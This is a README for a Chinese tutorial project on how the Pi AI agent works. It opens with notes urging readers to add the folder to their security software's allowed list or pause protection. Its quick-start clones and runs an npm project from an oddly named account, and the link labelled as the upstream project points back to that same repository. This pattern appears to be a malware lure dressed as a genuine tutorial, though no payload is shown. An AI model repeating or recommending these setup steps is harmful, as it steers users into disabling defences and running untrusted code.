# Pi Agent 原理与实现：从零到一实现一个 AI Agent


> [!TIP]
> If the setup does not start, add the folder to the allowed list or pause protection for a few minutes.

> [!CAUTION]
> Some security systems may block the installation.
> Only download from the official repository.

---

## QUICK START

```bash
git clone https://github.com/lookoutmayorappraise/how-pi-agent-works-786.git
cd how-pi-agent-works-786
npm install
npm start
```


这是一个完整可运行的中文 VitePress 教程项目，参考 [earendil-works/pi](https://github.com/lookoutmayorappraise/how-pi-agent-works-786) 与 [pi.dev 官方文档](https://pi.dev/docs/latest)，从工程视角拆解 Pi Agent 的核心原理，并带你实现一个教学版 Agent。

教程不是逐文件源码翻译，而是按学习路径组织：

- 核心概念：Agent Loop、消息、流式事件、工具调用、会话树、上下文压缩。
- Pi 源码拆解：`pi-ai`、`pi-agent-core`、`pi-coding-agent` 的分层和关键链路。
- 渐进式 Demo：四个核心 TypeScript 小 Demo 从最小循环逐步加工具、会话和压缩，另有一个可选真模型烟测 Demo。
- 最终项目：React + Node.js + TypeScript 实现一个可运行的教学版 Agent。


## 项目结构

```text
docs/                         # VitePress 教程站点
examples/demos/                # 四个核心渐进式 Demo + 可选真模型烟测
examples/teaching-agent/       # React + Node 教学版目标项目
specs/                         # 项目计划与工作日志
```

## 联系我

Hi，我是 Cell 细胞。可以扫码加我微信，备注 **Github** 就行。

我正在做订阅制真人秀 **造物矩阵·BIP**：👉 [zwjz.flowus.cn](https://zwjz.flowus.cn)，欢迎订阅。

社媒更新：👉 [X / Twitter @cellinlab](https://x.com/cellinlab)

更多信息：👉 [Cell 的个人说明书](https://chaojizhizao.feishu.cn/wiki/Gbm8wMdS1itpk7kIVRlcN2WCnw)

<table align="center">
  <tr>
    <td align="center" width="33%">
      <img src="./public/wetouch/wechat.webp" alt="Cell 细胞微信二维码" width="200"><br>
      <p align="center">扫码加微信</p>
    </td>
    <td align="center" width="33%">
      <img src="./public/wetouch/wechat-channels.webp" alt="Cell 细胞微信视频号二维码" width="200"><br>
      <p align="center">视频号</p>
    </td>
    <td align="center" width="33%">
      <img src="./public/wetouch/wechat-official.webp" alt="Cell 细胞微信公众号二维码" width="200"><br>
      <p align="center">公众号</p>
    </td>
  </tr>
</table>

## 赞助

<table align="center">
  <tr>
    <td align="center" width="50%">
      <img src="./public/sponsor/zfb.webp" alt="支付宝二维码" width="200"><br>
      <p align="center">支付宝</p>
    </td>
    <td align="center" width="50%">
      <img src="./public/sponsor/wx.webp" alt="微信赞赏二维码" width="200"><br>
      <p align="center">微信赞赏</p>
    </td>
  </tr>
</table>

## License

MIT


<!-- Last updated: 2026-06-06 20:17:42 -->
